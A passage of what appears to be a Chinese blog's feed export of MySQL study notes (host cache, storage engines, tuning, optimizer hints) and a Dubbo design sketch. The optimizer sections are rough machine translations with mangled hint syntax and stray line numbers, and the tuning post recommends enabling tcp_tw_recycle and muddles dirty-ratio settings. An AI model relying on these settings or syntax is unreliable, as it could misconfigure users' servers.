gethostbyaddr_r()并 gethostbyname_r()在操作系统支持它们时调用。否则，执行查找的线程会锁定互斥锁并调用 gethostbyaddr()， gethostbyname()而不是。在这种情况下，除非持有互斥锁的线程释放它，否则其他线程无法解析主机缓存中找不到的主机名。要取消阻止阻止的主机，请通过发出FLUSH HOSTS语句或执行mysqladmin flush-hosts命令来刷新主机缓存 。即使没有FLUSH HOSTS来自阻止主机的最后一次连接尝试后发生的来自其他主机的活动，阻止的主机也可能变为畅通无阻。发生这种情况的原因可能是服务器放弃了最近最少使用的高速缓存条目，以便在连接从不在高速缓存中的客户端IP到达时缓存已满时为新条目腾出空间。如果放弃的条目用于阻止的主机，则该主机将变为未阻止状态。主机缓存默认启用。要禁用它，请host_cache_size在服务器启动时或运行时将系统变量设置 为0。要禁用DNS主机名查找，请使用该--skip-name-resolve选项启动服务器 。在这种情况下，服务器仅使用IP地址，而不使用主机名将连接主机与MySQL授权表中的行匹配。只能使用那些使用IP地址的表中指定的帐户。（如果不存在指定客户端IP地址的帐户，则客户端可能无法连接。）如果您的DNS和主机速度非常慢，则可以通过禁用DNS查找来提高性能，--skip-name-resolve或者通过增大host_cache_size用于使主机缓存更大的值 来提高性能 。要完全禁止TCP / IP连接，请使用该--skip-networking选项启动服务器。某些连接错误与TCP连接无关，在连接过程中很早（甚至在知道IP地址之前），或者不特定于任何特定IP地址（如内存不足条件）。有关这些错误的信息，请检查 状态变量（请参见 第5.1.9节“服务器状态变量”）。 Connection_errors_xxx]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql存储过程]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-stored-procedure%2F</url>
    <content type="text"><![CDATA[1234DELIMIT ; CREATE DROP ();DELIMIT // 为什么使用存储过程有过统计:一个事务提交放到service层 大概一秒能处理500个(好像是2ms一个.算上网络延迟)而使用mysql存储过程 一秒钟大概能处理2000个事物 阿里编码规范有讲不适用存储过程.维护起来很困难.但是该用还得用.像秒杀.]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL版本选择]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-version-selected%2F</url>
    <content type="text"><![CDATA[学习阿里mysql笔记 mysql 历史过程中产生了三个版本 Percona Server : 有领先的MYSQL咨询公司 Percona公司发布 Maria DB : MYSQL最早创始人 重新做的一个版本 MYSQL : Oracle公司收购的版本 关于mysql存储引擎：MyISAM、InnoDB、XtraDB12345最早、最原始的存储引擎MyISAM、缺点不支持事务、优点 读写性能要好InnoDB 支持了事务、并把数据操作记录到日志、安全性较好、读写性能也有很大提高、稍低MyISAM(mysql 5.5之后默认存储引擎选取了InnoDB)XtraDB 是InnoDB增强版本、被设计用来更新计算机硬件系统性能、同时还包含了一些高性能环境下新特性。 1234567891011121314Percona Server发展到10.X版本、最接近mysql企业版本最主要特性、提供了存储引擎 XtraDB、还提供PXC高可用解决方案、还有percona-tookit等DBA管理工具箱、【据使用经验 这个版本性能非常非常高的 推荐排名第一位】MariaDB 目标、取代现在mysql、oracle的mysql闭源危机使用完全兼容mysql。优点支持脚本初始化、与最初mysql代码改动最大、成熟度较低支持新工具、新功能在不断完善、、【第二推荐】MYSQL ：官方版本、使用量最多、后续趋势会被其他两种取代、性能方面、在企业版本会增加一些新功能、但是收费【第三推荐、对性能要求不高、稳定版本】 InnoDB :支持事务 、行级锁、外键]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【SQL语句】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-sentence%2F</url>
    <content type="text"><![CDATA[1、select语句 1234567891011121、删除无效括号【为了增加运算速度牺牲的可读性、mysql会做类似优化】2、持续折叠3、恒定条件去除【为了更好的逻辑可读性重复字段=固定值】4、及时检测无效常量表达式5、关于havingwhere 、如果不与group by、或者count、min、等聚合函数一起使用、尽量不要使用6、where 表达式尽量简单、便于快速建立where评估表7、查询其他表之前首先查询所有常量表【 SELECT * FROM t WHERE primary_key=1; SELECT * FROM t1,t2 WHERE t1.primary_key=1 AND t2.primary_key=t1.id;】 2、范围优化对于两种索引结构使用不同的范围条件【hash索引、B树索引】 ==========mmp 太难了 没办法写下去 只能贴图了 以后慢慢品鉴]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【绩效衡量】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-performance-measurement%2F</url>
    <content type="text"><![CDATA[8.13.1测量表达式和函数的速度8.13.2使用您自己的基准8.13.3使用performance_schema测量绩效要衡量绩效，请考虑以下因素： 无论您是在安静系统上测量单个操作的速度，还是在一段时间内如何操作一组操作（ “ 工作负载 ”）。通过简单的测试，您通常可以测试更改一个方面（配置设置，表上的索引集，查询中的SQL子句）如何影响性能。基准测试通常是长时间运行和精心设计的性能测试，其结果可能决定硬件和存储配置等高级选择，或者升级到新MySQL版本的时间。 对于基准测试，有时您必须模拟繁重的数据库工作负载才能获得准确的图像。 表现可能会因许多不同的因素而有所不同，因为几个百分点的差异可能不是决定性的胜利。在不同的环境中进行测试时，结果可能会发生相反的变化。 某些MySQL功能根据工作负载提供帮助或无法帮助提高性能。为了完整性，请始终在打开和关闭这些功能的情况下测试性能。尝试与每个工作负载的两个最重要的功能是 MySQL查询缓存，以及 适应性的散列索引的InnoDB表。 本节从单个开发人员可以执行的简单和直接测量技术发展到需要额外专业知识来执行和解释结果的更复杂测量技术。 8.13.1测量表达式和函数的速度要测量特定MySQL表达式或函数的速度，请BENCHMARK()使用mysql客户端程序调用该函数。它的语法是 。返回值始终为零，但mysql 打印一行显示语句执行的时间。例如： BENCHMARK(loop_count,expression) MySQL的&gt; SELECT BENCHMARK(1000000,1+1); ———————— +| 基准（1000000,1 + 1）| ———————— +| 0 | ———————— +1排（0.32秒）该结果在Pentium II 400MHz系统上获得。它表明MySQL可以在0.32秒内在该系统上执行1,000,000个简单的加法表达式。 内置的MySQL函数通常是高度优化的，但可能有一些例外。 BENCHMARK()是一个很好的工具，可以找出某些功能是否是您的查询的问题。 8.13.2使用您自己的基准对您的应用程序和数据库进行基准测试，以找出瓶颈所在。在修复一个瓶颈（或者用“ 虚拟 ”模块替换它）之后，您可以继续识别下一个瓶颈。即使您的应用程序的整体性能目前是可接受的，您至少应该为每个瓶颈制定计划，并决定如果有一天您真的需要额外的性能，如何解决它。 免费的基准测试套件是开源数据库基准测试，可从http://osdb.sourceforge.net/获得。 仅在系统负载很重时才会出现问题。我们有许多客户在生产（已测试）系统并遇到负载问题时与我们联系。在大多数情况下，性能问题可能是由于基本数据库设计问题（例如，高负载下的表扫描不好）或操作系统或库的问题。大多数情况下，如果系统尚未投入生产，这些问题将更容易解决。 为了避免这样的问题，在最糟糕的负载下对整个应用程序进行基准测试： 该mysqlslap程序可以是用于模拟由多个客户端同时发出查询产生的高负载有帮助的。请参见第4.5.9节“ mysqlslap - 加载仿真客户端”。 您还可以尝试使用基准测试程序包，例如SysBench和DBT2，可在 https://launchpad.net/sysbench和 http://osdldbt.sourceforge.net/#dbt2获得。 这些程序或软件包可以使系统瘫痪，因此请务必仅在开发系统上使用它们。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见MYSQL调优策略]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-total-2%2F</url>
    <content type="text"><![CDATA[调优层次：硬件层、磁盘IO、文件系统层、 硬件层1234修改服务器BIOS设置1.选择Performance Per Watt Optimized(DAPC)模式 、发挥cpu最大性能2.Memory Frequency(内存频率)选择 Maximum Performance (最佳性能)3.内存设置菜单中，启用Node Interleaving 避免NUMA问题 磁盘IO1231.使用SSD磁盘(瞬时写入非常高、还可以避免很多技术问题)2.如果是磁盘阵列存储，建议阵列卡同时配备CACHE及BBU模块，可以明显提升IOPS。3.raid级别尽量选择raid10.而不是raid5(双io方式、也能提高安全性等等) 文件系统层1231.使用deadline/noop这两种I/O调度器。千万别用cfq2.使用xfs文件系统、千万别用ext3、ext4勉强可用、但是事务量很大一定要用xfs3.文件系统mount参数中增加：noatime，nodiratime，nobarrier几个选项(nobarrier是xfs文件系统特有的) 内核参数优化 1.修改vm.swappiness参数，降低swap使用率，RHEL7/centos7以上则慎重设置为0，可能引发OOM(物理内存使用到了90%之后才去修改、设为5-10就可以) 2.调整vm.dirty_background_ratio(脏数据量占内存量百分比、超过后将脏数据刷到磁盘、最大值（阻塞写）10%)、vm.dirty ratio(标准值（非阻塞写）5%) 内核参数、以确保能持续将脏数据刷新到磁盘，避免瞬I/O写，产生等待。 3.调整net.ipv4.tcp_tw_recycle、net.ipv4.tcp_tw_reuse都设置为1、减少Time_wait,提高TCP效率 MYSQL参数优化建议]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【总方向】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-total%2F</url>
    <content type="text"><![CDATA[老生常谈 SQL 优化而且一百度一堆，却没有一个令人满意的 秉承官方文档 原则 【MYSQL第八章 SQL优化】 优化方向：SQL查询and存储1234sql语句sql索引sql数据库结构sql表【InnoDb表、MyISAM表、Memory表】 缓存12查询优化器缓冲和高速缓冲区 锁1优化锁定操作 MYSQL服务器1234系统因素-并发量磁盘IO内存使用网络使用 检查1检查线程信息]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[假如让你设计一个dubbo【一】]]></title>
    <url>%2F2018%2F03%2F24%2Frpc%2Fdubbo-0%2F</url>
    <content type="text"><![CDATA[假设我们开发一个rpc远程调用框架 那么这个框架需要怎么去写 1、首先有远程配置中心config 2、有服务代理层【包装业务上的服务做一个代理】 3、有服务注册中心【代理了服务之后 向该注册中心注册服务代理】 4、有路由【远程调用先走路由获取服务代理实例、集群必备的东西】 5、有远程调用层【发起服务调用】 6、有网络传输层、有信息交换层【这个是一个传输协议的实现层】 7、有序列化层【针对网络IO信息编码方式的统一、传输协议最基本的东西】 8、服务监控【不属于RPC、但是服务监控必不可少】 总结： 核心配置：服务注册中心、服务代理和服务调用 优化配置：配置中心、服务监控、 基石配置：网络传输以及协议、序列化方式的定制 dubbo框架设计 简单用自己的语言描述这个图 1、左上角 Dubbo Framework 2、左上角往右简单标识 每个颜色代表什么意思、更好理解图中数据流向 消费者、提供者、开始、接口、类、继承关系、调用链方向、依赖方向 3、左侧一竖列、黑体字 service\config、等等 服务接口【service】、配置层【config】、服务代理层【proxy】、注册中心【registry】、 路由【cluster】、监控中心【monitor】、远程调用【protocol】、 信息交换【exchange】、网络传输【transport】、数据序列化【serialize】 结合自己所想做一个分类 核心配置：服务代理层【proxy】、注册中心【registry】、远程调用【protocol】 优化配置：配置层【config】、路由【cluster】、监控中心【monitor】 基石配置：信息交换【exchange】、网络传输【transport】、数据序列化【serialize】 简单猜想一下dubbo这么设计的代码架构1234567891011121314151617181920212223service：对外暴露接口 API与SPI分离config：核心referenceConfig、ServiceConfig serviceConfig----获取远程仓库配置、获取文件配置、貌似还可以获取环境变量 【实质上跟修改本地host一个道理、规定了一个locahost代理 然后操作系统去解析这个配置】referenceConfig--是消费端配置、其应该是从服务端获取配置信息proxy：不由想到代理模式、原业务逻辑bean不变、新建bean来实现原bean的代理【也算是一种封装】registry：注册中心、看过eureka、底层内存中维护了 一个双map结构数据列表、维护服务实例、服务地址、以及代理service等cluster：路由器、想到最简单的就是url转发、当然肯定没这么简单、应该还会有、实时获取服务列表、负载均衡算法等等monitor：监控中心、这个web服务把各路信息提上来做一个展示、应该没啥、最多维护一个硬盘文件protocol：远程调用、怎么调用--不太清楚--再看看exchange：信息交换、request、response封装transport：网络传输、大名鼎鼎的netty就在这吧~~seriallize：数据序列化、提供多重序列化方式、hessian【本地存根方式】、rmi等等吧]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【查询器优化·二】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-selector-2%2F</url>
    <content type="text"><![CDATA[8.9.1控制查询计划评估 123456789101112131415161718192021222324252627查询优化器的任务是查找执行SQL查询的最佳计划。由于“ 好 ”和“ 坏 ”之间的表现差异计划可以是数量级（即秒数与数小时甚至数天）， 大多数查询优化器（包括MySQL的查询优化器）在所有可能的查询评估计划中执行或多或少的穷举搜索优化计划。 对于连接查询，由MySQL优化器调查的可能计划的数量随着查询中引用的表的数量呈指数增长。 对于少量表格（通常小于7到10），这不是问题。 但是，当提交更大的查询时，查询优化花费的时间可能很容易成为服务器性能的主要瓶颈。用于查询优化的更灵活的方法使用户能够控制优化器在搜索最优查询评估计划时的详尽程度。总体思路是，优化程序调查的计划越少，编译查询花费的时间就越少。另一方面，因为优化器跳过了一些计划，所以可能会错过找到最佳计划。优化程序相对于其计算的计划数量的行为可以使用两个系统变量进行控制：该optimizer_prune_level 变量告诉优化器根据每个表访问的行数的估计值跳过某些计划。我们的经验表明，这种“ 受过教育的猜测 ”很少会错过最佳计划，并且可能大大减少查询编译时间。这就是为什么这个选项optimizer_prune_level=1默认是on（）。但是，如果您认为优化器错过了更好的查询计划，则可以关闭此选项（optimizer_prune_level=0）与查询编译可能花费更长时间的风险有关。请注意，即使使用这种启发式，优化器仍然会探索大致指数级的计划。这个optimizer_search_depth 变量告诉优化器应该看看每个不完整计划的“ 未来 ”有多远，以评估它是否应该进一步扩展。较小的值 optimizer_search_depth可能会导致查询编译时间缩短几个数量级。例如，如果optimizer_search_depth接近查询中的表的数量，具有12,13或更多表的查询可能很容易需要数小时甚至数天来编译 。同时，如果编译一下 optimizer_search_depth 等于3或4，优化器可以在不到一分钟的时间内编译相同的查询。如果您不确定合理的值是什么 optimizer_search_depth，则可以将此变量设置为0，以通知优化器自动确定该值。 8.9.2优化器提示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378控制优化器策略的一种方法是设置 optimizer_switch系统变量（参见第* 8.9.3节“可切换优化”）。对此变量的更改影响所有后续查询的执行; 为了对另一个查询产生不同的影响，有必要optimizer_switch在每个查询之前进行更改 。另一种控制优化器的方式是使用优化器提示，它可以在单个语句中指定。由于优化器提示适用于每个语句的基础上，因此它们提供了对语句执行计划的更好的控制，而不是使用的方式 optimizer_switch。例如，您可以在语句中为一个表启用优化，并禁用针对其他表的优化。语句中的提示优先于 optimizer_switch标志。例子：SELECT / * + NO_RANGE_OPTIMIZATION（t3 PRIMARY，f2_idx）* / f1 FROM t3 where f1&gt; 30 AND f1 &lt;33;SELECT / * + BKA（t1）NO_BKA（t2）* / *从t1 INNER JOIN t2 WHERE ...;SELECT / * + NO_ICP（t1，t2）* / * FROM t1 INNER JOIN t2 WHERE ...;SELECT / * + SEMIJOIN（FIRSTMATCH，LOOSESCAN）* / * FROM t1 ...;EXPLAIN SELECT / * + NO_ICP（t1）* / * FROM t1 WHERE ...;注意默认情况下 ，mysql客户端从发送到服务器的SQL语句（包括优化器提示）中删除注释，直到MySQL 5.7.7更改为将优化器提示传递给服务器。为了确保如果您使用旧版本的mysql客户端与理解优化器提示的服务器版本，优化器提示不会被剥离，请使用 该 选项调用 mysql--comments。此处介绍的优化器提示与第8.9.4节“索引提示”中介绍的索引提示有所不同。优化器和索引提示可以单独使用或一起使用。优化器提示概述优化器提示语法表级优化器提示索引级优化器提示子查询优化器提示语句执行时间优化器提示用于命名查询块的优化器提示优化器提示概述优化器提示适用于不同的范围级别：全局：提示影响整个陈述查询块：提示影响语句中的特定查询块表级别：提示影响查询块中的特定表索引级别：提示影响表格中的特定索引下表总结了可用的优化器提示，它们影响的优化器策略以及它们所应用的范围。更多细节在后面给出。表8.2可用的优化器提示提示名称 描述 适用范围BKA， NO_BKA 影响批量键访问连接处理 查询块，表BNL， NO_BNL 影响块嵌套循环连接处理 查询块，表MAX_EXECUTION_TIME 限制语句执行时间 全球MRR， NO_MRR 影响多范围读取优化 表，索引NO_ICP 影响索引条件下推优化 表，索引NO_RANGE_OPTIMIZATION 影响范围优化 表，索引QB_NAME 将名称分配给查询块 查询块SEMIJOIN， NO_SEMIJOIN 影响半连接策略 查询块SUBQUERY 影响物化， IN至- EXISTS 子查询配置的对策探讨 查询块禁用优化可防止优化器使用它。启用优化意味着如果优化程序适用于语句执行，则可以自由使用策略，而不是优化程序必须使用它。优化器提示语法如第9.6节“注释语法”中所述，MySQL支持SQL语句中的 注释。优化器提示必须在/*+ ... */注释中指定。也就是说，优化器提示使用/* ... */ C样式注释语法的变体，并+在/*注释打开序列后面加上一个字符。例子：/ * + BKA（t1）* // * + BNL（t1，t2）* // * + NO_RANGE_OPTIMIZATION（t4 PRIMARY）* // * + QB_NAME（qb2）* /在+ 字符后面允许使用空格。分析器的初始关键字后承认优化提示意见SELECT， UPDATE， INSERT， REPLACE，和 DELETE语句。在这些情况下允许提示：在查询和数据更改语句的开始处：SELECT / * + ... * / ...INSERT / * + ... * / ...REPLACE / * + ... * / ...UPDATE / * + ... * / ...删除/ * + ... * / ...在查询块的开始处：（SELECT / * + ... * / ...）（SELECT ...）UNION（SELECT / * + ... * / ...）（SELECT / * + ... * / ...）UNION（SELECT / * + ... * / ...）UPDATE ... WHERE x IN（SELECT / * + ... * / ...）INSERT ... SELECT / * + ... * / ...在由...开头的暗示性陈述中 EXPLAIN。例如：EXPLAIN SELECT / * + ... * / ...EXPLAIN UPDATE ... WHERE x IN（SELECT / * + ... * / ...）这意味着您可以使用它 EXPLAIN来查看优化器提示如何影响执行计划。SHOW WARNINGS之后立即使用 EXPLAIN，看看如何使用提示。EXPLAIN 以下SHOW WARNINGS显示的扩展输出指示使用了哪些提示。不显示忽略的提示。提示注释可能包含多个提示，但查询块不能包含多个提示注释。这是有效的：SELECT / * + BNL（t1）BKA（t2）* / ...但这是无效的：SELECT / * + BNL（t1）* / / * BKA（t2）* / ...当提示注释包含多个提示时，存在重复和冲突的可能性。以下一般准则适用。对于特定的提示类型，可能会应用其他规则，如提示说明中所述。重复提示：对于一个提示，如/*+ MRR(idx1) MRR(idx1) */MySQL使用第一个提示并发出关于重复提示的警告。冲突提示：对于一个提示，如/*+ MRR(idx1) NO_MRR(idx1) */MySQL使用第一个提示并发出关于第二个冲突提示的警告。查询块名称是标识符，并遵循关于哪些名称有效以及如何引用它们的通用规则（请参见 第9.2节“模式对象名称”）。提示名称，查询块名称和策略名称不区分大小写。对表和索引名称的引用遵循通常的标识符区分大小写规则（请参见 第9.2.2节“标识符区分大小写”）。表级优化器提示表级提示影响使用块嵌套循环（BNL）和（BKA）成批键访问的加入处理算法（参见 第8.2.1.11，“块嵌套循环和成批键访问联接”）。这些提示类型适用于特定表或查询块中的所有表。表级提示的语法：hint_name（[@ query_block_name] [ tbl_name[，tbl_name] ...]） hint_name（[ tbl_name@ query_block_name[，tbl_name@ query_block_name] ...]）语法引用了这些术语：hint_name：这些提示名称是允许的：BKA，NO_BKA：为指定的表启用或禁用BKA。BNL，NO_BNL：启用或禁用指定表的BNL。注意要使用BNL或BKA提示为外连接的任何内部表启用连接缓冲，必须为外连接的所有内部表启用连接缓冲。tbl_name：声明中使用的表的名称。该提示适用于它命名的所有表。如果提示不命名表，它将应用于它发生的查询块的所有表。如果表有别名，提示必须引用别名，而不是表名。提示中的表名称不能用模式名称限定。query_block_name：提示适用的查询块。如果提示不包含前导 ，则该提示将应用于其发生的查询块。对于 语法，该提示适用于指定查询块中的指定表。要为查询块分配名称，请参阅 命名查询块的优化器提示。 @query_block_nametbl_name@query_block_name例子：SELECT / * + NO_BKA（t1，t2）* / t1。* FROM t1 INNER JOIN t2 INNER JOIN t3;SELECT / * + NO_BNL（）BKA（t1）* / t1。* FROM t1 INNER JOIN t2 INNER JOIN t3;表级提示适用于从前面的表中接收记录的表，而不是发送者表。考虑这个说法：SELECT / * + BNL（t2）* / FROM t1，t2;如果优化器选择t1 首先进行处理，则会在开始读取之前 t2通过缓冲行来 应用块嵌套循环连接 。如果优化器选择首先处理，则提示不起作用，因为是发送者表。 t1t2t2t2索引级优化器提示索引级提示会影响优化程序对特定表或索引使用的索引处理策略。这些提示类型影响使用索引条件下推（ICP），多范围读取（MRR）和范围优化（请参见 第8.2.1节“优化SELECT语句”）。索引级提示的语法：hint_name（[@ query_block_name] tbl_name[ index_name[，index_name] ...]） hint_name（tbl_name@ query_block_name[ index_name[，index_name] ...]）语法引用了这些术语：hint_name：这些提示名称是允许的：MRR，NO_MRR：启用或禁用指定表或索引的MRR。MRR提示仅适用于 表格InnoDB和 MyISAM表格。NO_ICP：为指定的表或索引禁用ICP。默认情况下，ICP是一个候选优化策略，所以没有启用它的提示。NO_RANGE_OPTIMIZATION：禁用指定表或索引的索引范围访问。此提示还会禁用索引合并和索引扫描以查找表或索引。默认情况下，范围访问是一个候选优化策略，所以没有启用它的提示。当范围数可能很高并且范围优化需要许多资源时，这个提示可能是有用的。tbl_name：提示适用的表格index_name：指定表中索引的名称。该提示适用于它命名的所有索引。如果提示不命名索引，则它适用于表中的所有索引。要引用主键，请使用该名称 PRIMARY。要查看表格的索引名称，请使用SHOW INDEX。query_block_name：提示适用的查询块。如果提示不包含前导 ，则该提示将应用于其发生的查询块。对于 语法，该提示适用于指定查询块中的指定表。要为查询块分配名称，请参阅 命名查询块的优化器提示。 @query_block_nametbl_name@query_block_name例子：SELECT / * + MRR（t1）* / * FROM t1 WHERE f2 &lt;= 3 AND 3 &lt;= f3;SELECT / * + NO_RANGE_OPTIMIZATION（t3 PRIMARY，f2_idx）* / f1 FROM t3 where f1&gt; 30 AND f1 &lt;33;INSERT INTO t3（f1，f2，f3） （SELECT / * + NO_ICP（t2）* / t2.f1，t2.f2，t2.f3 FROM t1，t2 WHERE t1.f1 = t2.f1 AND t2.f2 BETWEEN t1.f1 AND t1.f2 AND t2.f2 + 1&gt; = t1.f1 + 1）;子查询优化器提示子查询提示影响是否使用半连接的转换和半连接策略允许，而当半联接未使用，是否使用子查询物化或 IN至- EXISTS 变换。有关这些优化的更多信息，请参见第8.2.2节“优化子查询，派生表和视图引用”。影响半连接策略的提示语法：hint_name（[@ query_block_name] [ strategy[，strategy] ...]）语法引用了这些术语：hint_name：这些提示名称是允许的：SEMIJOIN， NO_SEMIJOIN：启用或禁用指定的半连接策略。strategy：启用或禁用半连接策略。这些策略名允许：DUPSWEEDOUT， FIRSTMATCH， LOOSESCAN， MATERIALIZATION。对于SEMIJOIN提示，如果未命名策略，则根据optimizer_switch系统变量启用的策略，尽可能使用半连接 。如果战略被命名但不适用于该声明，DUPSWEEDOUT则会被使用。对于NO_SEMIJOIN提示，如果没有策略被命名，则不使用半连接。如果策略被命名为排除声明的所有适用策略，DUPSWEEDOUT则使用该策略 。如果一个子查询嵌套在另一个子查询中，并且两者都合并到外部查询的半连接中，则最内层查询的任何半连接策略规范都将被忽略。 SEMIJOIN并且NO_SEMIJOIN 仍然可以使用提示来启用或禁用此类嵌套子查询的半连接转换。如果DUPSWEEDOUT被禁用，则有时优化器可能会生成一个远离最佳状态的查询计划。这发生在贪婪搜索期间的启发式修剪，可以通过设置来避免 optimizer_prune_level=0。例子：SELECT / * + NO_SEMIJOIN（@ subq1 FIRSTMATCH，LOOSESCAN）* / *从t2 WHERE t2.a IN（SELECT / * + QB_NAME（subq1）* / a FROM t3）;SELECT / * + SEMIJOIN（@ subq1 MATERIALIZATION，DUPSWEEDOUT）* / *从t2开始 WHERE t2.a IN（SELECT / * + QB_NAME（subq1）* / a FROM t3）;影响是否使用子查询实现或IN-to- EXISTS 转换的提示语法 ：SUBQUERY（[@ query_block_name] strategy）提示名称总是SUBQUERY。对于SUBQUERY提示，这些 strategy值是允许的： INTOEXISTS， MATERIALIZATION。例子：SELECT id，IN（SELECT / * + SUBQUERY（MATERIALIZATION）* / a FROM t1）FROM t2;SELECT * FROM t2 WHERE t2.a IN（SELECT / * + SUBQUERY（INTOEXISTS）* / a FROM t1）;对于半连接和SUBQUERY提示，前导 指定提示适用的查询块。如果提示不包含前导 ，则该提示将应用于其发生的查询块。要为查询块分配名称，请参阅 命名查询块的优化器提示。 @query_block_name@query_block_name如果提示注释包含多个子查询提示，则使用第一个。如果还有其他类型的提示，则会发出警告。其他类型的提示被默默忽略。语句执行时间优化器提示该MAX_EXECUTION_TIME提示仅适用于SELECT语句。它N在语句允许在服务器终止之前执行多长时间内放置一个限制（以毫秒为单位的超时值）：MAX_EXECUTION_TIME（N）超时时间为1秒（1000毫秒）的示例：SELECT / * + MAX_EXECUTION_TIME（1000）* / *从t1 INNER JOIN t2 WHERE ...该 提示设置了毫秒的语句执行超时 。如果此选项不存在或为0，则由系统变量建立的语句超时 适用。 MAX_EXECUTION_TIME(N)NNmax_execution_time该MAX_EXECUTION_TIME提示适用如下：对于具有多个SELECT 关键字的语句（例如具有子查询的联合或语句） MAX_EXECUTION_TIME适用于整个语句，并且必须出现在第一个语句之后 SELECT。它适用于只读 SELECT语句。不是只读的语句是那些调用一个存储函数，将数据修改为副作用的语句。它不适用于SELECT 存储程序中的语句，并且被忽略。用于命名查询块的优化器提示表级别，索引级别和子查询优化器提示允许将特定查询块命名为其参数语法的一部分。要创建这些名称，请使用 QB_NAME提示，它为其发生的查询块分配一个名称：QB_NAME（name）QB_NAME提示可以用来清楚地明确哪些查询块适用于其他提示。它们还允许在单个提示注释中指定所有非查询块名称提示，以便于理解复杂语句。考虑以下声明：选择 ... FROM（SELECT ... FROM（SELECT ... FROM ...））...QB_NAME 提示为语句中的查询块分配名称：SELECT / * + QB_NAME（qb1）* / ... FROM（SELECT / * + QB_NAME（qb2）* / ... FROM（SELECT / * + QB_NAME（qb3）* / ... FROM ...））...然后其他提示可以使用这些名称来引用适当的查询块：SELECT / * + QB_NAME（qb1）MRR（@ qb1 t1）BKA（@ qb2）NO_MRR（@ qb3t1 idx1，id2）* / ... FROM（SELECT / * + QB_NAME（qb2）* / ... FROM（SELECT / * + QB_NAME（qb3）* / ... FROM ...））...其结果如下所示：MRR(@qb1 t1)适用t1于查询块中的 表格 qb1。BKA(@qb2)适用于查询块 qb2。NO_MRR(@qb3 t1 idx1, id2)适用于索引idx1和 查询块idx2中的表格。 t1qb3查询块名称是标识符，并遵循关于哪些名称有效以及如何引用它们的通用规则（请参见 第9.2节“模式对象名称”）。例如，包含空格的查询块名称必须用引号引起来，这可以使用反引号来完成：SELECT / * + BKA（@`my hint name`）* / ... FROM（SELECT / * + QB_NAME（`my hint name`）* / ...）...如果ANSI_QUOTES启用了SQL模式，则也可以在双引号内引用查询块名称：SELECT / * + BKA（@“my hint name”）* / ... FROM（SELECT / * + QB_NAME（“my hint name”）* / ...）... 8.9.3可切换优化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258该optimizer_switch系统变量能够在优化行为的控制。它的值是一组标志，每个标志都有一个值on 或off表示相应的优化器行为是启用还是禁用。该变量具有全局和会话值，并且可以在运行时更改。全局默认值可以在服务器启动时设置。要查看当前的优化器标志集，请选择变量值：MySQL的&gt; SELECT @@optimizer_switch\G*************************** 1. row ******************** *******@@ optimizer_switch：index_merge = on，index_merge_union = on， index_merge_sort_union =开， index_merge_intersection =开， engine_condition_pushdown =开， index_condition_pushdown =开， MRR =开，上mrr_cost_based =， block_nested_loop =开，batched_key_access =关， 物化=开，半连接=上，loosescan =开， firstmatch =开，duplicateweedout =开， subquery_materialization_cost_based =开， use_index_extensions =开， condition_fanout_filter =开，derived_merge =上要更改值 optimizer_switch，请分配一个由逗号分隔的一个或多个命令列表组成的值：SET [GLOBAL | SESSION] optimizer_switch =&apos; command[，command] ...&apos;;每个command值应具有下表中显示的一种形式。命令语法 含义default 将每个优化重置为默认值opt_name=default 将指定的优化设置为其默认值opt_name=off 禁用命名优化opt_name=on 启用指定的优化该值中的命令顺序无关紧要，但该default命令如果存在则首先执行。一个设置opt_name标志 default设置它取的 on或者off是它的默认值。opt_name 不允许多次指定给定的值并导致错误。值中的任何错误都会导致分配失败，并显示错误，并使值 optimizer_switch保持不变。以下列表描述了opt_name按优化策略分组的允许 标志名称：批量键访问标志batched_key_access（默认 off）控制BKA连接算法的使用。为了batched_key_access在设置时有任何效果on，该 mrr标志也必须是 on。目前，MRR的成本估算过于悲观。因此，也有必要对 